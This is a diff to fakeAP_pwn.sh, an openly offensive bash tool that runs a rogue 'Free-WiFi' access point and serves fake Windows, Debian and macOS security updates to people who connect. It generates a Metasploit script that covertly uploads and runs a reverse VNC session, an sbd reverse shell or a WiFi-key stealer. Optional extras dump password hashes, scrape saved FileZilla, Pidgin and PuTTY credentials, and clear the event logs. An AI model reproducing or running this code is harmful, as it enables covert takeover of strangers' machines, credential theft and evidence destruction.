@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC23 2010-07-11)                                                         #
+# fakeAP_pwn.sh (v0.3-RC24 2010-07-13)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -14,6 +14,7 @@
 #        Doesn't work too well!                                                                #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
+# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                           crafted page without affecting any other clients who are browsing  #
 #                           Create a captive portal with:                                      #
@@ -21,13 +22,16 @@
 #                               -FreeRadius                                                    #
 #                               -MySQL                                                         #
 # v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
-# v0.4 - HostAP           - Add support for HostAP & Hardware AP                               #
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
-# v0.7 - S.E.T.           - Social Engineering Toolkit                                         #
+# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients...             #
+# v0.8 - S.E.T.           - Social Engineering Toolkit                                         #
+#                                                                                              #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 # Metasploit "fun"        - Automate a few more "things"                                       #
-# Clone AP                - Copies SSID & MAC address then kick all...                          #
+#----------------------------------------------------------------------------------------------#
+#def upload(session,file,filename = \"\",trgloc = \"\")                                        #
+#use vnc.rb                                                                                    #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
 export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
@@ -38,12 +42,12 @@ export monitorInterface=mon0                         # The interface airmon-ng c
 export          payload=wkv                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
 export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
 export   metasploitPath=/pentest/exploits/framework3 # Metasploit directory. No trailing slash.
-export    htdocs_folder=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
+export       htdocsPath=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
 export              mtu=1800                         # 1500/1800/xxxx - If your having timing out problems, change this.
 export      transparent=true                         # true/false - Internet access after infected? true = yes, false = no
 export      respond2All=false                        # true/false - Respond to every WiFi probe request? true = yes, false = no
-export        fakeAPmac=random                       # random/fixed/false - Change the FakeAP MAC Address? 
-export      mac_address=22:23:45:67:89:AB            # Set the MAC XX:XX:XX:XX:XX:XX (used when fakeAPmac set to fixed)
+export        fakeAPmac=random                       # random/set/false - Change the FakeAP MAC Address?
+export       macAddress=18:39:05:18:39:05            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
 export           extras=false                        # true/false - Runs extra programs after session is created
 export            debug=false                        # true/false - If you're having problems
 export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
@@ -52,7 +56,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC23"
+export   version="0.3-RC24"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #----------------------------------------------------------------------------------------------#
 function cleanup() {
@@ -71,9 +75,9 @@ function cleanup() {
          $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"
          rm /etc/apache2/sites-available/fakeAP_pwn
       fi
-      if test -e $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; fi
-      if test -e $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin; fi
-      if test -e $htdocs_folder/Windows-KB183905-x86-ENU.exe;     then rm $htdocs_folder/Windows-KB183905-x86-ENU.exe; fi
+      if test -e $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb; fi
+      if test -e $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin; fi
+      if test -e $htdocsPath/Windows-KB183905-x86-ENU.exe;     then rm $htdocsPath/Windows-KB183905-x86-ENU.exe; fi
       #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface"
       echo "0" > /proc/sys/net/ipv4/ip_forward
       iptables --flush
@@ -89,7 +93,7 @@ function help() {
 
  Usage: bash fakeAP_pwn.sh -e [ESSID] -c [channel] -i [interface] -w [interface]
              -m [interface]  -p [sbd/vnc/other] -b [/path] -s [/path] -h [/path] -t [MTU]
-             -n -r -z -e -d -v -V [-u] [-?]
+             -n -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]
 
  Common options:
    -e  ---  WiFi Name e.g. Free-WiFi
@@ -102,12 +106,13 @@ function help() {
    -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
    -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe
    -s  ---  Metasploit Path (Where is metasploit is located) e.g. /pentest/exploits/framework3
-   -h  ---  htdocs folder e.g. /var/www/fakeAP_pwn. No trailing slash.
+   -h  ---  htdocs path e.g. /var/www/fakeAP_pwn. No trailing slash.
 
    -t  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
    -n  ---  Do you want them to have internet access after?
    -r  ---  Do you want to respond to every probe request?
    -z  ---  Randomizes the MAC Address of the FakeAP
+   -a  ---  Use this MAC Address
 
    -x  ---  Runs extra programs after session is created
    -d  ---  Debug Mode (Doesnt close any pop up windows)
@@ -138,7 +143,7 @@ function update() {
 #----------------------------------------------------------------------------------------------#
 echo -e "\e[01;36m[*]\e[00m g0tmilk's fakeAP_pwn v$version"
 
-while getopts "e:c:i:w:m:p:b:s:h:t:nrzxdvVu?" OPTIONS; do
+while getopts "e:c:i:w:m:p:b:s:h:t:nrz:a:xdvVu?" OPTIONS; do
   case ${OPTIONS} in
     e     ) export ESSID=$OPTARG;;
     c     ) export fakeAPchannel=$OPTARG;;
@@ -148,11 +153,12 @@ while getopts "e:c:i:w:m:p:b:s:h:t:nrzxdvVu?" OPTIONS; do
     p     ) export payload=$OPTARG;;
     b     ) export backdoorPath=$OPTARG;;
     s     ) export metasploitPath=$OPTARG;;
-    h     ) export htdocs_folder=$OPTARG;;
+    h     ) export htdocsPath=$OPTARG;;
     t     ) export mtu=$OPTARG;;
     n     ) export transparent="true";;
     r     ) export respond2All="true";;
-    z     ) export fakeAPmac="true";;
+    z     ) export fakeAPmac=$OPTARG;;
+    a     ) export macAddress=$OPTARG;;
     x     ) export extras="true";;
     d     ) export debug="true";;
     v     ) export verbose="1";;
@@ -181,7 +187,7 @@ if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
 \e[01;33m[i]\e[00m          payload=$payload
 \e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
 \e[01;33m[i]\e[00m   metasploitPath=$metasploitPath
-\e[01;33m[i]\e[00m    htdocs_folder=$htdocs_folder
+\e[01;33m[i]\e[00m    htdocsPath=$htdocsPath
 \e[01;33m[i]\e[00m              mtu=$mtu
 \e[01;33m[i]\e[00m      transparent=$transparent
 \e[01;33m[i]\e[00m      respond2All=$respond2All
@@ -228,6 +234,17 @@ if [ "$transparent" == "true" ]; then
    fi
 fi
 
+if [ "$ESSID" == "" ]; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank"; cleanup; fi
+if [ "$fakeAPchannel" == "" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPchannel can't be blank"; cleanup; fi
+if [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ]; then echo -e "\e[00;31m[-]\e[00m payload isn't correct"; cleanup; fi
+if [ "$transparent" != "true" ] && [ "$payload" != "false" ]; then echo -e "\e[00;31m[-]\e[00m transparent isn't correct"; cleanup; fi
+if [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ]; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct"; cleanup; fi
+if [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct"; cleanup; fi
+if ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ]; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct"; cleanup; fi
+if [ "$extras" != "true" ] && [ "$extras" != "false" ]; then echo -e "\e[00;31m[-]\e[00m extras isn't correct"; cleanup; fi
+if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then echo -e "\e[00;31m[-]\e[00m debug isn't correct"; cleanup; fi
+if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then echo -e "\e[00;31m[-]\e[00m verbose isn't correct"; cleanup; fi
+
 if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then echo -e "\e[00;31m[-]\e[00m aircrack-ng isn't installed. Try: apt-get install aircrack-ng"; cleanup; fi
 if ! test -e /usr/sbin/apache2; then   echo -e "\e[00;31m[-]\e[00m apache2 isn't installed. Try: apt-get install apache2 php"; cleanup; fi
 if ! test -e /usr/bin/macchanger; then echo -e "\e[00;31m[-]\e[00m macchanger isn't installed. Try: apt-get install macchanger"; cleanup; fi
@@ -241,15 +258,15 @@ if [ "$payload" == "other" ]; then
    fi
 fi
 
-if ! test -e "$htdocs_folder/index.php"; then
+if ! test -e "$htdocsPath/index.php"; then
    if test -d "www/"; then
-      mkdir -p $htdocs_folder
-      if [ "$verbose" == "2" ] ; then echo "[i] Command: cp -rf www/* $htdocs_folder/"; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "cp -rf www/* $htdocs_folder/"
+      mkdir -p $htdocsPath
+      if [ "$verbose" == "2" ] ; then echo "[i] Command: cp -rf www/* $htdocsPath/"; fi
+      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "cp -rf www/* $htdocsPath/"
    fi
 
-   if ! test -e "$htdocs_folder/index.php"; then
-      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $htdocs_folder/"
+   if ! test -e "$htdocsPath/index.php"; then
+      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $htdocsPath/"
       cleanup
    fi
 fi
@@ -271,10 +288,10 @@ if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterf
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface" &
 sleep 3
 if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface down"; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restarting the WiFi interface ($wifiInterface) (Stopping)" -e "ifconfig $wifiInterface down" &
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing down $wifiInterface" -e "ifconfig $wifiInterface down" &
 sleep 1
 if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $wifiInterface up"; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restarting the WiFi interface ($wifiInterface) (Starting)" -e "ifconfig $wifiInterface up" &
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "ifconfig $wifiInterface up"
 export pidcheck2=`ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
 if [ -n "$pidcheck2" ]; then
    if [ "$verbose" == "2" ] ; then echo "[i] Command: kill $pidcheck2"; fi
@@ -300,10 +317,10 @@ if [ "$fakeAPmac" == "random" ]; then
    $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up" &
    sleep 2
 fi
-if [ "$fakeAPmac" == "fixed" ]; then
+if [ "$fakeAPmac" == "set" ]; then
    echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
-   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -m $mac_address $monitorInterface && ifconfig $monitorInterface up"; fi
-   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -m $mac_address $monitorInterface && ifconfig $monitorInterface up" &
+   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up"; fi
+   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -m $macAddress $monitorInterface && ifconfig $monitorInterface up" &
    sleep 2
 fi
 
@@ -315,124 +332,210 @@ fi
 echo -e "\e[01;32m[>]\e[00m Creating scripts..."
 # metasploit script
 if test -e /tmp/fakeAP_pwn.rb; then rm /tmp/fakeAP_pwn.rb; fi
-echo "#! /usr/bin/env ruby
-# g0tmi1k - fakeAP_pwn.rb v$version
-print_line(\"[>] g0tmi1k's fakeAP_pwn v$version...\")
+echo "# Id: fakeAP_pwn.rb v$version$
+# Author: g0tmi1k at http://g0tmi1k.blogspot.com
 
-session = client
+
+################## Variable Declarations ##################
+@client   = client
 host,port = session.tunnel_peer.split(':')
-info = @client.sys.config.sysinfo
-os = info['OS']
-print_status(\"New session (#{os}) on #{host}:#{port}...\")
+os        = @client.sys.config.sysinfo['OS']
+host      = @client.sys.config.sysinfo['Computer']
+arch      = @client.sys.config.sysinfo['Architecture']
+user      = @client.sys.config.getuid
+date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
 
-if not (os =~ /Linux/ || os =~ /OSX/ || os =~ /Windows/)
+######################## Functions ########################
+def doLinux
+	print_status(\"Coming soon...\")
+end
+
+def doOSX
+	print_status(\"Coming soon...\")
+end
+
+def doWindows
+	session.response_timeout=120
+	begin"> /tmp/fakeAP_pwn.rb
+if [ "$payload" == "vnc" ]; then
+   echo "		print_status(\"Stopping: winvnc.exe\")
+		session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Deleting: VNC\")
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\winvnc.exe DEL /f IF EXIST %SystemDrive%\\\winvnc.exe\", nil, {'Hidden' => true})
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnchooks.dll DEL /f IF EXIST %SystemDrive%\\\vnchooks.dll\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Uploading: VNC (%SystemDrive%\\\winvnc.exe)\")
+		session.fs.file.upload_file(\"%SystemDrive%\\\winvnc.exe\", \"$htdocsPath/winvnc.exe\")
+		session.fs.file.upload_file(\"%SystemDrive%\\\vnchooks.dll\", \"$htdocsPath/vnchooks.dll\")
+		session.fs.file.upload_file(\"%SystemDrive%\\\vnc.reg\", \"$htdocsPath/vnc.reg\")
+		sleep(1)
+
+		print_status(\"Configuring: VNC\")
+		session.sys.process.execute(\"regedit.exe /S %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Executing: winvnc.exe\")
+		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\winvnc.exe -kill -run\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Configuring: VNC (Reserving connection).\")
+		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\winvnc.exe -connect 10.0.0.1\", nil, {'Hidden' => true})
+
+		print_status(\"Deleting: Temp files\")
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnc.reg DEL /f IF EXIST %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
+elif [ "$payload" == "sbd" ]; then
+   echo "		print_status(\"Stopping: sbd.exe\")
+		session.sys.process.execute(\"cmd.exe /C taskkill /IM sbd.exe /F\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Deleting: sbd.exe\")
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\sbd.exe DEL /f IF EXIST %SystemDrive%\\\sbd.exe\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Uploading: SecureBackDoor (%SystemDrive%\\\sbd.exe)\")
+		session.fs.file.upload_file(\"%SystemDrive%\\\sbd.exe\", \"$htdocsPath/sbd.exe\")
+		sleep(1)
+
+		print_status(\"Executing: sbd.exe\")
+		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
+elif [ "$payload" == "wkv" ]; then
+   echo "	print_status(\"  Uploading: Wireless Key Viewer (%SystemDrive%\\\wkv.exe)\")
+		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
+			session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocsPath/wkv-x64.exe\")
+		else
+			session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocsPath/wkv-x86.exe\")
+		end
+		sleep(1)
+
+		print_status(\"  Executing: wkv.exe\")
+		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\wkv.exe /stabular \\\"%SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
+		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%SystemDrive%\\\wkv.txt\")
+
+		print_status(\"   Deleting: Traces\")
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.exe DEL /f IF EXIST %SystemDrive%\\\wkv.exe\", nil, {'Hidden' => true})
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.txt DEL /f IF EXIST %SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
+else
+   echo "		print_status(\"Stopping: backdoor.exe\")
+		session.sys.process.execute(\"cmd.exe /C taskkill /IM backdoor.exe /F\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Deleting: %SystemDrive%\\\backdoor.exe\")
+		session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\backdoor.exe DEL /f IF EXIST %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})
+		sleep(1)
+
+		print_status(\"Uploading: backdoor.exe (%SystemDrive%\\\backdoor.exe)\")
+		session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")
+		sleep(1)
+
+		print_status(\"Executing: backdoor.exe\")
+		session.sys.process.execute(\"cmd.exe /C %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
+fi
+echo "		sleep(1)
+
+	rescue ::Exception => e
+		print_status(\"Error: #{e.class} #{e}\")
+	end
+end
+
+def checkuac(session)
+	begin
+		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
+		value = open_key.query_value(\"EnableLUA\").data
+		if value == 1
+			print_status(\" UAC: Enabled\")
+		else
+			print_status(\" UAC: Disabled\")
+		end
+	rescue ::Exception => e
+		print_status(\"Error Checking UAC: #{e.class} #{e}\")
+	end
+end
+
+########################### Main ##########################
+print_line(\"[*] g0tmi1k's fakeAP_pwn $version\")" >> /tmp/fakeAP_pwn.rb
+
+if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
+echo "print_status(\"-------------------------------------------\")
+print_status(\"Date: #{date}\")
+print_status(\"  IP: #{host}:#{port}\")
+print_status(\"  OS: #{os}\")
+print_status(\"Host: #{host}\")
+if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
+checkuac(session)
+end
+print_status(\"Arch: #{arch}\")
+print_status(\"User: #{user}\")
+print_status(\"Mode: $payload\")
+print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
+fi
+echo "if os =~ /Linux/
+	doLinux
+elsif os =~ /OSX/
+	doOSX
+elsif os =~ /Windows/
+#	run getcountermeasure.rb -d
+	doWindows
+else
 	print_error(\"Unsupported OS\")
 	exit
 end
-if (os =~ /Linux/)
-	print_status(\"Coming soon...\")
-	#doLinux(client)
-end
-if (os =~ /OSX/)
-	print_status(\"Coming soon...\")
-	#doOSX(client)
-end
-if (os =~ Windows)" > /tmp/fakeAP_pwn.rb
-if [ "$payload" == "vnc" ]; then
-   echo "	print_status(\"Killing old VNC (Remote Desktop)...\")
-	session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
-	sleep(1)
 
-	print_status(\"Removing old VNC...\")
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\winvnc.exe DEL /f IF EXIST %SystemDrive%\\\winvnc.exe\", nil, {'Hidden' => true})
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnchooks.dll DEL /f IF EXIST %SystemDrive%\\\vnchooks.dll\", nil, {'Hidden' => true})
-	sleep(1)
+print_status(\" Unlocking: fakeAP_pwn\")
+output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
+output.puts(\"g0tmi1k\")
+output.close
+sleep(1)" >> /tmp/fakeAP_pwn.rb
 
-	print_status(\"Uploading VNC...\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\winvnc.exe\", \"$htdocs_folder/winvnc.exe\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\vnchooks.dll\", \"$htdocs_folder/vnchooks.dll\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\vnc.reg\", \"$htdocs_folder/vnc.reg\")" >> /tmp/fakeAP_pwn.rb
-elif [ "$payload" == "sbd" ]; then
-   echo "	print_status(\"Killing old SBD (SecureBackDoor)...\")
-	session.sys.process.execute(\"cmd.exe /C taskkill /IM sbd.exe /F\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Removing old SBD...\")
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\sbd.exe DEL /f IF EXIST %SystemDrive%\\\sbd.exe\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Uploading SBD...\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\sbd.exe\", \"$htdocs_folder/sbd.exe\")" >> /tmp/fakeAP_pwn.rb
-elif [ "$payload" == "wkv" ]; then
-   echo "	print_status(\"Uploading WKV...\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocs_folder/wkv.exe\")" >> /tmp/fakeAP_pwn.rb
-else
-   echo "	print_status(\"Killing old backdoor ($backdoorPath)...\")
-	session.sys.process.execute(\"cmd.exe /C taskkill /IM backdoor.exe /F\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Removing old backdoor...\")
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\backdoor.exe DEL /f IF EXIST %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Uploading backdoor.exe...\")
-	session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")" >> /tmp/fakeAP_pwn.rb
-fi
-echo "	sleep(1)
-" >> /tmp/fakeAP_pwn.rb
-if [ "$payload" == "vnc" ]; then
-   echo "	print_status(\"Configuring VNC...\")
-	session.sys.process.execute(\"regedit.exe /S %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Executing VNC...\")
-	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\winvnc.exe -kill -run\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Reversing VNC...\")
-	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\winvnc.exe -connect 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
-elif [ "$payload" == "sbd" ]; then
-   echo "	print_status(\"Executing SBD...\")
-	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
-elif [ "$payload" == "wkv" ]; then
-   echo "	print_status(\"Executing WKV...\")
-	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\wkv.exe /stabular \\\"%SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Downloading keys...\")
-	session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%SystemDrive%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
-else
-   echo "	print_status(\"Executing backdoor.exe...\")
-	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
-fi
-echo "	sleep(1)
-
-	print_status(\"Creating proof...\")
-	session.sys.process.execute(\"cmd.exe /C ipconfig | find \\\"IP\\\" > \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
-	sleep(1)
-
-	print_status(\"Downloading proof...\")
-	session.fs.file.download_file(\"/tmp/fakeAP_pwn.lock\", \"%SystemDrive%\\\ip.log\")
-	sleep(1)
-
-	print_status(\"Removing proof...\")
-	session.sys.process.execute(\"cmd.exe /C del /f \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
-	sleep(1)
-" >> /tmp/fakeAP_pwn.rb
-if [ "$payload" == "vnc" ]; then
-   echo "	print_status(\"Removing temp VNC files...\")
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnc.reg DEL /f IF EXIST %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
-	sleep(1)" >> /tmp/fakeAP_pwn.rb
-elif [ "$payload" == "wkv" ]; then
-   echo "	print_status(\"Removing temp WKV files...\")
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.exe DEL /f IF EXIST %SystemDrive%\\\wkv.exe\", nil, {'Hidden' => true})
-	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.txt DEL /f IF EXIST %SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
-	sleep(1)" >> /tmp/fakeAP_pwn.rb
+if [ "$debug" == "true" ] || [ "$extras" == "true" ] ; then
+echo "print_status(\"-------------------------------------------\")
+print_status(\"Extras\")
+screenshot
+#----
+use priv
+getsystem
+hashdump # >> /tmp/fakeAP_Pwn.hash
+#----
+sysinfo
+ps
+ipconfig
+route
+#enumdesktops
+#getdesktop
+#setdesktop
+#----
+run checkvm.rb
+run dumplinks.rb -e
+run enum_firefox.rb
+run enum_logged_on_users.rb -c -l
+run enum_putty.rb
+run get_application_list.rb
+run getcountermeasure.rb -d -k
+run get_env.rb
+run get_filezilla_creds.rb -c
+run get_loggedon_users.rb -c -l
+run get_pidgin_creds.rb -b -c -l
+run getvncpw.rb
+#run killav.rb
+run remotewinenum.rb
+run scraper.rb
+run winenum.rb -r
+#----
+clearev
+print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
 fi
 echo "
-end" >> /tmp/fakeAP_pwn.rb
+
+print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
 if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi
+
+exit
 
 # dhcpd script
 if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
@@ -467,12 +570,12 @@ fi
 if test -e /etc/apache2/sites-available/fakeAP_pwn; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
 echo "<VirtualHost *:80>
 	ServerAdmin webmaster@localhost
-	DocumentRoot $htdocs_folder
+	DocumentRoot $htdocsPath
 	<Directory />
 		Options FollowSymLinks
 		AllowOverride None
 	</Directory>
-	<Directory $htdocs_folder>
+	<Directory $htdocsPath>
 		Options Indexes FollowSymLinks MultiViews
 		AllowOverride None
 		Order allow,deny
@@ -487,12 +590,12 @@ echo "<VirtualHost *:80>
 <IfModule mod_ssl.c>
 <VirtualHost _default_:443>
 	ServerAdmin webmaster@localhost
-	DocumentRoot $htdocs_folder
+	DocumentRoot $htdocsPath
 	<Directory />
 		Options FollowSymLinks
 		AllowOverride None
 	</Directory>
-	<Directory $htdocs_folder>
+	<Directory $htdocsPath>
 		Options Indexes FollowSymLinks MultiViews
